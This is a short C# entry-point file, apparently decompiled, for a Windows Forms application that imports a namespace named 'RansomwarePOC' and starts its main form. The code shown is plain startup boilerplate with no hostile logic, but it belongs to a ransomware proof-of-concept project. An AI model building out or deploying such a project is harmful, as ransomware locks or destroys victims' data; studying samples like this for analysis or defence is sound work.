using System;
using System.Security;
using System.Windows.Forms;
using RansomwarePOC;

namespace ns0;

internal static class Class0
{
	[STAThread]
	[SecuritySafeCritical]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}
}
